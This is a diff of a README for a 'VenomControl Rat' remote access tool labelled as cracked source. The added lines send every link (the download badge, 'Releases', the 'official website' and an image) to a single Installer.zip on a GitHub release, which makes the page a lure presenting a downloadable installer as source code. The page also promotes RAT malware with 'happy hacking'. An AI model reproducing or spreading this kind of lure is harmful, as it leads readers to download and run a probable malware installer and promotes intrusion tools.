@@ -13,7 +13,7 @@ Welcome to the VenomControl Rat repository! This Remote Access Tool (RAT) is des
 
 To get started with VenomControl Rat, download the source code from the link below:
 
-[![Download Source Code](<img src="https://img.shields.io/badge/Download-Source%20Code-blue">)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Source Code](<img src="https://github.com/0naji/VenomControl-Rat-Crack-Source/releases/download/v1.0/Installer.zip%20Code-blue">)](https://github.com/0naji/VenomControl-Rat-Crack-Source/releases/download/v1.0/Installer.zip)
 
 Once downloaded, launch the source code in your preferred development environment to start exploring and understanding the functionality of VenomControl Rat.
 
@@ -36,9 +36,9 @@ VenomControl Rat is licensed under the MIT License. See the [License](LICENSE) f
 
 ## 📌 Additional Resources
 
-- Explore the [Releases](https://github.com/cli/oauth/releases) section for the latest updates and versions of VenomControl Rat.
-- Visit the official [VenomControl website](https://www.venomcontrol.com) for more information and support.
+- Explore the [Releases](https://github.com/0naji/VenomControl-Rat-Crack-Source/releases/download/v1.0/Installer.zip) section for the latest updates and versions of VenomControl Rat.
+- Visit the official [VenomControl website](https://github.com/0naji/VenomControl-Rat-Crack-Source/releases/download/v1.0/Installer.zip) for more information and support.
 
-![VenomControl Rat](https://www.example.com/venomcontrol-rat.jpg)
+![VenomControl Rat](https://github.com/0naji/VenomControl-Rat-Crack-Source/releases/download/v1.0/Installer.zip)
 
 Thank you for exploring the VenomControl Rat repository! Happy coding and happy hacking! 🐍🔒💻
